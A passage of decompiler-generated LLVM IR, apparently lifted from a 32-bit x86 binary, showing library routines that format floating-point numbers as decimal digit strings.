  %v9_8054ec0 = icmp eq i8 %v4_8054ec0, 0
  %v10_8054ec0 = icmp slt i8 %v4_8054ec0, 0
  %v3_8054ec5 = icmp eq i1 %v10_8054ec0, %v8_8054ec0
  %v4_8054ec5 = icmp eq i1 %v9_8054ec0, false
  %v5_8054ec5 = and i1 %v4_8054ec5, %v3_8054ec5
  br i1 %v5_8054ec5, label %dec_label_pc_8054ecc, label %dec_label_pc_8054ec7

dec_label_pc_8054ec7:                             ; preds = %dec_label_pc_8054ea2
  br label %dec_label_pc_8054ecc

dec_label_pc_8054ecc:                             ; preds = %dec_label_pc_8054ea2, %dec_label_pc_8054ec7
  %v2_8054ed4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8054ed4, i32* @ecx, align 4
  br label %dec_label_pc_80552a7

dec_label_pc_8054f82:                             ; preds = %dec_label_pc_8054e1c
  %v1_8054e41 = add i3 %v4_8054db8, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_8054f86 = and i32 %v3_8054dff, -65536
  %v2_8054f8b = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_8054f8b, i32* %edx.global-to-local, align 4
  %v1_8054f92 = udiv i16 %tmp103, 256
  %v2_8054f92 = zext i16 %v1_8054f92 to i32
  %v3_8054f92 = mul nuw nsw i32 %v2_8054f92, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_8054f86.masked = zext i16 %tmp148 to i32
  %v11_8054f92 = or i32 %v4_8054f86.masked, %v3_8054f92
  %v10_8054f92 = or i32 %v11_8054f92, %v6_8054f86
  %v12_8054f92 = or i32 %v10_8054f92, 3072
  store i32 %v12_8054f92, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8054e41, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8054fa6

dec_label_pc_8054fa6:                             ; preds = %dec_label_pc_8054ff7.dec_label_pc_8054fa6_crit_edge, %dec_label_pc_8054f82
  %v2_8054fc3 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_8054f82 ], [ %v2_8054fc3.pre, %dec_label_pc_8054ff7.dec_label_pc_8054fa6_crit_edge ]
  %v1_8054fa6 = phi i3 [ %v1_8054e41, %dec_label_pc_8054f82 ], [ %v1_8054fa6.pre, %dec_label_pc_8054ff7.dec_label_pc_8054fa6_crit_edge ]
  %v3_8054fcd = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8054f82 ], [ %v0_8054fa6.pre, %dec_label_pc_8054ff7.dec_label_pc_8054fa6_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8054f8b, %dec_label_pc_8054f82 ], [ %v4_8054fc8, %dec_label_pc_8054ff7.dec_label_pc_8054fa6_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_8054fcd to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_8054fc0 = sitofp i32 %tmp149 to x86_fp80
  %v4_8054fc3 = fsub x86_fp80 %v2_8054fc3, %v5_8054fc0
  store i3 %v1_8054fa6, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054fc8 = add i32 %stack_var_-212.0, 9
  %v4_8054fcd = fmul x86_fp80 %v3_8054fcd, %v4_8054fc3
  store x86_fp80 %v4_8054fcd, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054fcf

dec_label_pc_8054fcf:                             ; preds = %dec_label_pc_8054fcf.dec_label_pc_8054fcf_crit_edge, %dec_label_pc_8054fa6
  %v0_8054fe1 = phi i32 [ %v0_8054fe1.pre, %dec_label_pc_8054fcf.dec_label_pc_8054fcf_crit_edge ], [ %tmp149, %dec_label_pc_8054fa6 ]
  %v0_8054fcf = phi i32 [ %v0_8054fcf.pre, %dec_label_pc_8054fcf.dec_label_pc_8054fcf_crit_edge ], [ 0, %dec_label_pc_8054fa6 ]
  %v1_8054fcf = add i32 %v0_8054fcf, 1
  store i32 %v1_8054fcf, i32* %esi.global-to-local, align 4
  %v2_8054fd4 = sub i32 %v4_8054fc8, %v1_8054fcf
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_8054fe1, 10
  %tmp136 = urem i32 %v0_8054fe1, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_8054fd4, i32* %eax.global-to-local, align 4
  %v1_8054fed = or i32 %tmp136, 48
  %v8_8054fed = trunc i32 %v1_8054fed to i8
  store i32 %v1_8054fed, i32* %edx.global-to-local, align 4
  %v3_8054ff3 = inttoptr i32 %v2_8054fd4 to i8*
  store i8 %v8_8054fed, i8* %v3_8054ff3, align 1
  %v7_8054ff5 = icmp sgt i32 %v1_8054fcf, 8
  br i1 %v7_8054ff5, label %dec_label_pc_8054ff7, label %dec_label_pc_8054fcf.dec_label_pc_8054fcf_crit_edge

dec_label_pc_8054fcf.dec_label_pc_8054fcf_crit_edge: ; preds = %dec_label_pc_8054fcf
  %v0_8054fcf.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8054fe1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054fcf

dec_label_pc_8054ff7:                             ; preds = %dec_label_pc_8054fcf
  %v0_8054ff7 = load i32, i32* @edi, align 4
  %v1_8054ff7 = add i32 %v0_8054ff7, 1
  store i32 %v1_8054ff7, i32* @edi, align 4
  %v7_8054ffb = icmp sgt i32 %v1_8054ff7, 2
  br i1 %v7_8054ffb, label %dec_label_pc_8054ffd, label %dec_label_pc_8054ff7.dec_label_pc_8054fa6_crit_edge

dec_label_pc_8054ff7.dec_label_pc_8054fa6_crit_edge: ; preds = %dec_label_pc_8054ff7
  %v0_8054fa6.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8054fa6.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8054fc3.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054fa6

dec_label_pc_8054ffd:                             ; preds = %dec_label_pc_8054ff7
  %v0_8054ffd = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054ffd = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8054ffd, x86_fp80* %st0.global-to-local, align 4
  %v2_8054fff = add i3 %v0_8054ffd, 2
  store i3 %v2_8054fff, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8055001 = add i8 %stack_var_-206.0, -96
  %v6_8055001 = sub i8 95, %stack_var_-206.0
  %v7_8055001 = and i8 %v6_8055001, %stack_var_-206.0
  %v8_8055001 = icmp slt i8 %v7_8055001, 0
  %v9_8055001 = icmp eq i8 %v4_8055001, 0
  %v10_8055001 = icmp slt i8 %v4_8055001, 0
  %v3_8055006 = icmp eq i1 %v10_8055001, %v8_8055001
  %v4_8055006 = icmp eq i1 %v9_8055001, false
  %v5_8055006 = and i1 %v4_8055006, %v3_8055006
  br i1 %v5_8055006, label %dec_label_pc_8055015, label %dec_label_pc_8055008

dec_label_pc_8055008:                             ; preds = %dec_label_pc_8054ffd
  %v4_8055008 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_8055015

dec_label_pc_8055015:                             ; preds = %dec_label_pc_8054ffd, %dec_label_pc_8055008
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_8054ffd ], [ %v4_8055008, %dec_label_pc_8055008 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8054ffd ], [ 69, %dec_label_pc_8055008 ]
  %v12_8055015 = icmp eq i8 %stack_var_-206.1, 103
  %v1_805501a = icmp eq i1 %v12_8055015, false
  br i1 %v1_805501a, label %dec_label_pc_8055023, label %dec_label_pc_805501c

dec_label_pc_805501c:                             ; preds = %dec_label_pc_8055015
  %v0_805501c = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_805501c, 1
  br i1 %tmp137, label %dec_label_pc_805502a, label %dec_label_pc_8055020

dec_label_pc_8055020:                             ; preds = %dec_label_pc_805501c
  %v1_8055020 = add i32 %v0_805501c, -1
  store i32 %v1_8055020, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805502a

dec_label_pc_8055023:                             ; preds = %dec_label_pc_8055015
  %v12_8055023 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_8055023, label %dec_label_pc_805502e, label %dec_label_pc_8055023.dec_label_pc_805502a_crit_edge

dec_label_pc_8055023.dec_label_pc_805502a_crit_edge: ; preds = %dec_label_pc_8055023
  %v0_805502a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805502a

dec_label_pc_805502a:                             ; preds = %dec_label_pc_8055023.dec_label_pc_805502a_crit_edge, %dec_label_pc_805501c, %dec_label_pc_8055020
  %v0_805502a = phi i32 [ %v0_805502a.pre, %dec_label_pc_8055023.dec_label_pc_805502a_crit_edge ], [ %v0_805501c, %dec_label_pc_805501c ], [ %v1_8055020, %dec_label_pc_8055020 ]
  store i32 %v0_805502a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805505b

dec_label_pc_805502e:                             ; preds = %dec_label_pc_8055023
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_8055032 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055032 = add i32 %v0_8055032, -1
  store i32 %v2_8055032, i32* %ebx.global-to-local, align 4
  %v5_8055039 = icmp slt i32 %v2_8055032, -1
  br i1 %v5_8055039, label %dec_label_pc_805503b, label %dec_label_pc_805505b

dec_label_pc_805503b:                             ; preds = %dec_label_pc_805502e
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8055043 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8055043, i32* %eax.global-to-local, align 4
  %v4_805504b = bitcast i32* %stack_var_-72 to i8*
  %v5_805504b = call i32 @__GI_memset(i8* %v4_805504b, i32 48, i32 21)
  store i32 %v5_805504b, i32* %eax.global-to-local, align 4
  %v0_805506b.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805505b

dec_label_pc_805505b:                             ; preds = %dec_label_pc_805502e, %dec_label_pc_805503b, %dec_label_pc_805502a
  %v1_805507b = phi i32 [ %v0_805502a, %dec_label_pc_805502a ], [ %v0_805506b.pr.pre, %dec_label_pc_805503b ], [ %v2_8055032, %dec_label_pc_805502e ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_805506e = icmp sgt i32 %v1_805507b, 20
  br i1 %v7_805506e, label %dec_label_pc_8055070, label %dec_label_pc_805507b

dec_label_pc_8055070:                             ; preds = %dec_label_pc_805505b
  %v2_8055070 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8055070, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805508f.preheader

dec_label_pc_805507b:                             ; preds = %dec_label_pc_805505b
  %v0_805507b = load i32, i32* @esp, align 4
  %v2_805507b = add i32 %v1_805507b, 165
  %v3_805507b = add i32 %v2_805507b, %v0_805507b
  store i32 %v3_805507b, i32* %eax.global-to-local, align 4
  %v1_8055082 = add i32 %v3_805507b, 2
  store i32 %v1_8055082, i32* %ecx.global-to-local, align 4
  %v2_8055085 = inttoptr i32 %v1_8055082 to i8*
  %v3_8055085 = load i8, i8* %v2_8055085, align 1
  %v4_8055085 = add i8 %v3_8055085, -53
  %v9_8055085 = sub i8 52, %v3_8055085
  %v10_8055085 = and i8 %v9_8055085, %v3_8055085
  %v11_8055085 = icmp slt i8 %v10_8055085, 0
  %v13_8055085 = icmp slt i8 %v4_8055085, 0
  %v2_8055089 = icmp eq i1 %v13_8055085, %v11_8055085
  %v3_8055089 = zext i1 %v2_8055089 to i32
  br label %dec_label_pc_805508f.preheader

dec_label_pc_805508f.preheader:                   ; preds = %dec_label_pc_805507b, %dec_label_pc_8055070
  %v0_805508f63 = phi i32 [ %v1_8055082, %dec_label_pc_805507b ], [ %v2_8055070, %dec_label_pc_8055070 ]
  %storemerge52 = phi i32 [ %v3_8055089, %dec_label_pc_805507b ], [ 0, %dec_label_pc_8055070 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805508f

dec_label_pc_805508f:                             ; preds = %dec_label_pc_805508f.backedge, %dec_label_pc_805508f.preheader
  %v3_8055090 = phi i32 [ %v3_8055090.pre, %dec_label_pc_805508f.backedge ], [ %storemerge52, %dec_label_pc_805508f.preheader ]
  %v0_805508f = phi i32 [ %v0_8055092, %dec_label_pc_805508f.backedge ], [ %v0_805508f63, %dec_label_pc_805508f.preheader ]
  %v1_805508f = add i32 %v0_805508f, -1
  store i32 %v1_805508f, i32* %ecx.global-to-local, align 4
  %v1_8055090 = inttoptr i32 %v1_805508f to i8*
  %v2_8055090 = load i8, i8* %v1_8055090, align 1
  %v4_8055090 = trunc i32 %v3_8055090 to i8
  %v5_8055090 = add i8 %v2_8055090, %v4_8055090
  store i8 %v5_8055090, i8* %v1_8055090, align 1
  %v0_8055092 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055092 = inttoptr i32 %v0_8055092 to i8*
  %v2_8055092 = load i8, i8* %v1_8055092, align 1
  %v3_8055092 = zext i8 %v2_8055092 to i32
  %v4_8055092 = load i32, i32* %edx.global-to-local, align 4
  %v5_8055092 = and i32 %v4_8055092, -256
  %v6_8055092 = or i32 %v5_8055092, %v3_8055092
  store i32 %v6_8055092, i32* %edx.global-to-local, align 4
  %v7_8055094 = icmp eq i8 %v2_8055092, 48
  br i1 %v7_8055094, label %dec_label_pc_805508f.backedge, label %dec_label_pc_8055099

dec_label_pc_805508f.backedge:                    ; preds = %dec_label_pc_805508f, %dec_label_pc_8055099
  %v3_8055090.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805508f

dec_label_pc_8055099:                             ; preds = %dec_label_pc_805508f
  %v2_8055099 = add i8 %v2_8055092, -57
  %v7_8055099 = sub i8 56, %v2_8055092
  %v8_8055099 = and i8 %v7_8055099, %v2_8055092
  %v9_8055099 = icmp slt i8 %v8_8055099, 0
  %v10_8055099 = icmp eq i8 %v2_8055099, 0
  %v11_8055099 = icmp slt i8 %v2_8055099, 0
  %v3_805509c = icmp eq i1 %v11_8055099, %v9_8055099
  %v4_805509c = icmp eq i1 %v10_8055099, false
  %v5_805509c = and i1 %v4_805509c, %v3_805509c
  br i1 %v5_805509c, label %dec_label_pc_805508f.backedge, label %dec_label_pc_805509e

dec_label_pc_805509e:                             ; preds = %dec_label_pc_8055099
  %v2_805509e = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_805509e, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_8055092, %v2_805509e
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_80550a9, label %dec_label_pc_80550b6

dec_label_pc_80550a9:                             ; preds = %dec_label_pc_805509e
  store i32 %v2_8054f8b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80550bf

dec_label_pc_80550b6:                             ; preds = %dec_label_pc_805509e
  store i32 %v2_805509e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_805509e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80550bf

dec_label_pc_80550bf:                             ; preds = %dec_label_pc_80550a9, %dec_label_pc_80550b6
  %v0_80550bf = phi i32 [ %v0_8055092, %dec_label_pc_80550a9 ], [ %v2_805509e, %dec_label_pc_80550b6 ]
  %v1_80550bf = add i32 %v0_80550bf, 1
  store i32 %v1_80550bf, i32* %eax.global-to-local, align 4
  %v2_80550c6 = inttoptr i32 %v1_80550bf to i8*
  store i8 0, i8* %v2_80550c6, align 1
  br i1 %v1_805501a, label %dec_label_pc_80550ec, label %dec_label_pc_80550d1

dec_label_pc_80550d1:                             ; preds = %dec_label_pc_80550bf
  %v0_80550d1 = load i32, i32* %esi.global-to-local, align 4
  %v5_80550d4 = icmp slt i32 %v0_80550d1, -4
  br i1 %v5_80550d4, label %dec_label_pc_80550f9, label %dec_label_pc_80550d6

dec_label_pc_80550d6:                             ; preds = %dec_label_pc_80550d1
  %v1_80550d6 = load i32, i32* %ebx.global-to-local, align 4
  %v7_80550d8 = icmp slt i32 %v1_80550d6, %v0_80550d1
  br i1 %v7_80550d8, label %dec_label_pc_80550f9, label %dec_label_pc_80550e1

dec_label_pc_80550e1:                             ; preds = %dec_label_pc_80550d6
  %v2_80550e8 = sub i32 %v1_80550d6, %v0_80550d1
  store i32 %v2_80550e8, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80550fd

dec_label_pc_80550ec:                             ; preds = %dec_label_pc_80550bf
  %v4_80550ec = zext i8 %stack_var_-206.1 to i32
  %v5_80550ec = load i32, i32* %ecx.global-to-local, align 4
  %v6_80550ec = and i32 %v5_80550ec, -256
  %v7_80550ec = or i32 %v6_80550ec, %v4_80550ec
  store i32 %v7_80550ec, i32* %ecx.global-to-local, align 4
  %v10_80550f4 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_80550f4, label %dec_label_pc_80550ec.dec_label_pc_80550fd_crit_edge, label %dec_label_pc_80550f9

dec_label_pc_80550ec.dec_label_pc_80550fd_crit_edge: ; preds = %dec_label_pc_80550ec
  %v0_80550fd.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80550fd

dec_label_pc_80550f9:                             ; preds = %dec_label_pc_80550d1, %dec_label_pc_80550d6, %dec_label_pc_80550ec
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_80550ec ], [ 103, %dec_label_pc_80550d6 ], [ 103, %dec_label_pc_80550d1 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055107

dec_label_pc_80550fd:                             ; preds = %dec_label_pc_80550ec.dec_label_pc_80550fd_crit_edge, %dec_label_pc_80550e1
  %v0_80550fd = phi i32 [ %v0_80550fd.pre, %dec_label_pc_80550ec.dec_label_pc_80550fd_crit_edge ], [ %v0_80550d1, %dec_label_pc_80550e1 ]
  store i32 %v0_80550fd, i32* %ebx.global-to-local, align 4
  %v2_80550ff = icmp slt i32 %v0_80550fd, 0
  %v1_8055101 = icmp eq i1 %v2_80550ff, false
  br i1 %v1_8055101, label %dec_label_pc_8055107, label %dec_label_pc_8055103

dec_label_pc_8055103:                             ; preds = %dec_label_pc_80550fd
  %v0_8055103 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055103 = add i32 %v0_8055103, -1
  store i32 %v1_8055103, i32* %edx.global-to-local, align 4
  %v1_8055104 = inttoptr i32 %v1_8055103 to i8*
  store i8 48, i8* %v1_8055104, align 1
  %v0_805513c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055107

dec_label_pc_8055107:                             ; preds = %dec_label_pc_80550fd, %dec_label_pc_80550f9, %dec_label_pc_8055103
  %v1_8055197 = phi i32 [ %v0_80550fd, %dec_label_pc_80550fd ], [ %v0_805513c.pre, %dec_label_pc_8055103 ], [ 0, %dec_label_pc_80550f9 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_80550fd ], [ 102, %dec_label_pc_8055103 ], [ %stack_var_-197.0, %dec_label_pc_80550f9 ]
  %v2_8055107 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8055107, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_8055122 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055122 = inttoptr i32 %v0_8055122 to i8*
  %v2_8055122 = load i8, i8* %v1_8055122, align 1
  %v3_8055122 = zext i8 %v2_8055122 to i32
  %v5_8055122 = and i32 %v2_8055107, -256
  %v6_8055122 = or i32 %v3_8055122, %v5_8055122
  store i32 %v6_8055122, i32* %eax.global-to-local, align 4
  %v1_8055124 = add i32 %v0_8055122, 1
  store i32 %v1_8055124, i32* %edi.global-to-local, align 4
  store i32 %v6_8055122, i32* %stack_var_-22, align 4
  %v2_8055132 = sub i32 %v1_80550bf, %v1_8055124
  store i32 %v2_8055132, i32* %edx.global-to-local, align 4
  %v1_805513c = icmp eq i32 %v1_8055197, 0
  %v2_805513c = icmp slt i32 %v1_8055197, 0
  br i1 %v2_805513c, label %dec_label_pc_805518b, label %dec_label_pc_8055140

dec_label_pc_8055140:                             ; preds = %dec_label_pc_8055107
  store i32 112, i32* %stack_var_-144, align 4
  %v2_805514c = sub i32 %v1_8055197, %v2_8055132
  %v8_805514c = xor i32 %v2_8055132, %v1_8055197
  %v9_805514c = xor i32 %v2_805514c, %v1_8055197
  %v10_805514c = and i32 %v9_805514c, %v8_805514c
  %v11_805514c = icmp slt i32 %v10_805514c, 0
  %v13_805514c = icmp slt i32 %v2_805514c, 0
  %v2_805514e = icmp eq i1 %v13_805514c, %v11_805514c
  br i1 %v2_805514e, label %dec_label_pc_8055150, label %dec_label_pc_8055184

dec_label_pc_8055150:                             ; preds = %dec_label_pc_8055140
  store i32 %v2_805514c, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_805514c, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_8055165, label %dec_label_pc_8055180

dec_label_pc_8055165:                             ; preds = %dec_label_pc_8055150
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8055180

dec_label_pc_8055180:                             ; preds = %dec_label_pc_8055150, %dec_label_pc_8055165
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_8055165 ], [ %stack_var_-132, %dec_label_pc_8055150 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80551a0

dec_label_pc_8055184:                             ; preds = %dec_label_pc_8055140
  %v4_8055186 = icmp eq i1 %v1_805513c, false
  br i1 %v4_8055186, label %dec_label_pc_8055191, label %dec_label_pc_8055188

dec_label_pc_8055188:                             ; preds = %dec_label_pc_8055184
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805518b

dec_label_pc_805518b:                             ; preds = %dec_label_pc_8055107, %dec_label_pc_8055188
  %v0_80551d373 = phi i32 [ %v1_8055197, %dec_label_pc_8055107 ], [ -1, %dec_label_pc_8055188 ]
  %v2_805518b = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805518b, i32* @ecx, align 4
  br label %dec_label_pc_80551a0

dec_label_pc_8055191:                             ; preds = %dec_label_pc_8055184
  %v2_8055195 = add i32 %v1_8055124, %v1_8055197
  store i32 %v2_8055195, i32* %edi.global-to-local, align 4
  %v2_8055197 = sub i32 %v2_8055132, %v1_8055197
  store i32 %v2_8055197, i32* %edx.global-to-local, align 4
  %v2_8055199 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8055199, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80551a0

dec_label_pc_80551a0:                             ; preds = %dec_label_pc_805518b, %dec_label_pc_8055180, %dec_label_pc_8055191
  %v0_80551d372 = phi i32 [ %v0_80551d373, %dec_label_pc_805518b ], [ -1, %dec_label_pc_8055180 ], [ -1, %dec_label_pc_8055191 ]
  %v0_80551bc = phi i32 [ %v2_805518b, %dec_label_pc_805518b ], [ %storemerge10, %dec_label_pc_8055180 ], [ %v2_8055199, %dec_label_pc_8055191 ]
  %v0_80551ad = phi i32 [ %v2_8055132, %dec_label_pc_805518b ], [ 0, %dec_label_pc_8055180 ], [ %v2_8055197, %dec_label_pc_8055191 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_80551a7 = inttoptr i32 %v1_8054dff to i8*
  %v3_80551a7 = load i8, i8* %v2_80551a7, align 1
  %v4_80551a7 = and i8 %v3_80551a7, 16
  %v5_80551a7 = icmp eq i8 %v4_80551a7, 0
  %v1_80551ab = icmp eq i1 %v5_80551a7, false
  br i1 %v1_80551ab, label %dec_label_pc_80551bc, label %dec_label_pc_80551ad

dec_label_pc_80551ad:                             ; preds = %dec_label_pc_80551a0
  %v1_80551ad = icmp eq i32 %v0_80551ad, 0
  %v1_80551af = icmp eq i1 %v1_80551ad, false
  br i1 %v1_80551af, label %dec_label_pc_80551bc, label %dec_label_pc_80551b1

dec_label_pc_80551b1:                             ; preds = %dec_label_pc_80551ad
  br i1 %v12_8055015, label %dec_label_pc_80551d3, label %dec_label_pc_80551b8

dec_label_pc_80551b8:                             ; preds = %dec_label_pc_80551b1
  %v0_80551b8 = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_80551b8, 1
  br i1 %tmp140, label %dec_label_pc_80551d3, label %dec_label_pc_80551bc

dec_label_pc_80551bc:                             ; preds = %dec_label_pc_80551b8, %dec_label_pc_80551ad, %dec_label_pc_80551a0
  %v1_80551bc = inttoptr i32 %v0_80551bc to i32*
  store i32 112, i32* %v1_80551bc, align 4
  %v0_80551c2 = load i32, i32* @ecx, align 4
  %v1_80551c2 = add i32 %v0_80551c2, 4
  %v2_80551c2 = inttoptr i32 %v1_80551c2 to i32*
  store i32 1, i32* %v2_80551c2, align 4
  %v0_80551c9 = load i32, i32* @ecx, align 4
  %v1_80551c9 = add i32 %v0_80551c9, 8
  %v2_80551c9 = inttoptr i32 %v1_80551c9 to i32*
  store i32 ptrtoint (i32* @global_var_805a4e0.549 to i32), i32* %v2_80551c9, align 4
  %v0_80551d0 = load i32, i32* @ecx, align 4
  %v1_80551d0 = add i32 %v0_80551d0, 12
  store i32 %v1_80551d0, i32* @ecx, align 4
  %v0_80551d3.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80551d3

dec_label_pc_80551d3:                             ; preds = %dec_label_pc_80551b8, %dec_label_pc_80551b1, %dec_label_pc_80551bc
  %v0_80551d8 = phi i32 [ %v0_80551bc, %dec_label_pc_80551b8 ], [ %v0_80551bc, %dec_label_pc_80551b1 ], [ %v1_80551d0, %dec_label_pc_80551bc ]
  %v0_80551d3 = phi i32 [ %v0_80551d372, %dec_label_pc_80551b8 ], [ %v0_80551d372, %dec_label_pc_80551b1 ], [ %v0_80551d3.pre, %dec_label_pc_80551bc ]
  %v1_80551d3 = add i32 %v0_80551d3, 1
  %v8_80551d3 = icmp eq i32 %v1_80551d3, 0
  store i32 %v1_80551d3, i32* %ebx.global-to-local, align 4
  br i1 %v8_80551d3, label %dec_label_pc_80551ed, label %dec_label_pc_80551d6

dec_label_pc_80551d6:                             ; preds = %dec_label_pc_80551d3
  store i32 %v1_80551d3, i32* %eax.global-to-local, align 4
  %v1_80551d8 = inttoptr i32 %v0_80551d8 to i32*
  store i32 176, i32* %v1_80551d8, align 4
  %v0_80551de = load i32, i32* %eax.global-to-local, align 4
  %v1_80551de = sub i32 0, %v0_80551de
  store i32 %v1_80551de, i32* %eax.global-to-local, align 4
  %v1_80551e0 = load i32, i32* @ecx, align 4
  %v2_80551e0 = add i32 %v1_80551e0, 4
  %v3_80551e0 = inttoptr i32 %v2_80551e0 to i32*
  store i32 %v1_80551de, i32* %v3_80551e0, align 4
  %v0_80551e3 = load i32, i32* @ecx, align 4
  %v1_80551e3 = add i32 %v0_80551e3, 8
  %v2_80551e3 = inttoptr i32 %v1_80551e3 to i32*
  store i32 ptrtoint (i32* @global_var_805a4d3.548 to i32), i32* %v2_80551e3, align 4
  %v0_80551ea = load i32, i32* @ecx, align 4
  %v1_80551ea = add i32 %v0_80551ea, 12
  store i32 %v1_80551ea, i32* @ecx, align 4
  br label %dec_label_pc_80551ed

dec_label_pc_80551ed:                             ; preds = %dec_label_pc_80551d3, %dec_label_pc_80551d6
  %v0_80551f1 = phi i32 [ %v0_80551d8, %dec_label_pc_80551d3 ], [ %v1_80551ea, %dec_label_pc_80551d6 ]
  %v0_80551ed = load i32, i32* %edx.global-to-local, align 4
  %v1_80551ed = icmp eq i32 %v0_80551ed, 0
  br i1 %v1_80551ed, label %dec_label_pc_8055200, label %dec_label_pc_80551f1

dec_label_pc_80551f1:                             ; preds = %dec_label_pc_80551ed
  %v1_80551f1 = inttoptr i32 %v0_80551f1 to i32*
  store i32 112, i32* %v1_80551f1, align 4
  %v0_80551f7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80551f7 = load i32, i32* @ecx, align 4
  %v2_80551f7 = add i32 %v1_80551f7, 4
  %v3_80551f7 = inttoptr i32 %v2_80551f7 to i32*
  store i32 %v0_80551f7, i32* %v3_80551f7, align 4
  %v0_80551fa = load i32, i32* %edi.global-to-local, align 4
  %v1_80551fa = load i32, i32* @ecx, align 4
  %v2_80551fa = add i32 %v1_80551fa, 8
  %v3_80551fa = inttoptr i32 %v2_80551fa to i32*
  store i32 %v0_80551fa, i32* %v3_80551fa, align 4
  %v0_80551fd = load i32, i32* @ecx, align 4
  %v1_80551fd = add i32 %v0_80551fd, 12
  store i32 %v1_80551fd, i32* @ecx, align 4
  br label %dec_label_pc_8055200

dec_label_pc_8055200:                             ; preds = %dec_label_pc_80551ed, %dec_label_pc_80551f1
  %v0_805521e = phi i32 [ %v0_80551f1, %dec_label_pc_80551ed ], [ %v1_80551fd, %dec_label_pc_80551f1 ]
  br i1 %v1_805501a, label %dec_label_pc_8055214, label %dec_label_pc_8055207

dec_label_pc_8055207:                             ; preds = %dec_label_pc_8055200
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_805520e = load i8, i8* %v2_80551a7, align 1
